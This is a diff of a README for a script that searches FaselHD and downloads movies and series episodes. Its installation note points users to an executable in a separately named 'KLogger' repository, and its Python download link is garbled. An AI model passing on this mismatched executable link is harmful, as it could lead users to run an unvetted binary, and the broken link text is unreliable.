@@ -13,8 +13,9 @@
 
 
 ### Description
-This script searches and extracts video links (movies or series episodes) from FaselHD using Playwright and BeautifulSoup. 
-It also provides a real-time progress bar (via rich) to track downloads and display the download status neatly.
+This script searches and extracts video links `movies` or `series episodes` from FaselHD using `Playwright` and `BeautifulSoup.` 
+It also provides a real-time progress bar via `rich` to track downloads and display the download status neatly.
+
 ### Features
 - **Comprehensive Downloading Capability:**  
   Designed to download both movies and TV series seamlessly.
@@ -23,7 +24,7 @@ It also provides a real-time progress bar (via rich) to track downloads and disp
   Supports simultaneous downloading of multiple episodes, improving efficiency and saving time.
   
 - **Multiple Video Quality Options:**  
-  Supports downloading videos in various qualities (1080p, 720p, 360p) and verifies the availability of the selected quality.
+  Supports downloading videos in various qualities `1080p, 720p, 360p` and verifies the availability of the selected quality.
   
 - **Interactive Command Line Interface:**  
   Provides a user-friendly CLI for searching TV series and movies, with easy selection of seasons and episodes.
@@ -38,7 +39,9 @@ It also provides a real-time progress bar (via rich) to track downloads and disp
     Manages browser sessions automatically to ensure efficient handling of search and extraction tasks.
 
 
+### Installation:
 
+* You can download a copy of the executable `EXE` file and run it directly without having to install Python. From here, [releases](https://github.com/De3vil/KLogger/releases)
 
 #### Requirements
 * python >= 3.9 ++ Download [Python](https://www.python.org/ftp/python/3.8.10/python-3.8.10-amd64.exe](https://www.python.org/ftp/python/3.13.2/python-3.13.2-amd64.exe))
@@ -46,17 +49,12 @@ It also provides a real-time progress bar (via rich) to track downloads and disp
 
 * os : Windows
 
-### Installation to Windows:
-
 ```bash
 git clone https://github.com/De3vil/Faselhd.git
 cd Faselhd
 pip install -r requirements.txt
 python nfshd.py
 ```
-
-* You can download a copy of the executable file and run it directly without having to install Python. From here, [releases](https://github.com/De3vil/KLogger/releases)
-
 
 
 ***
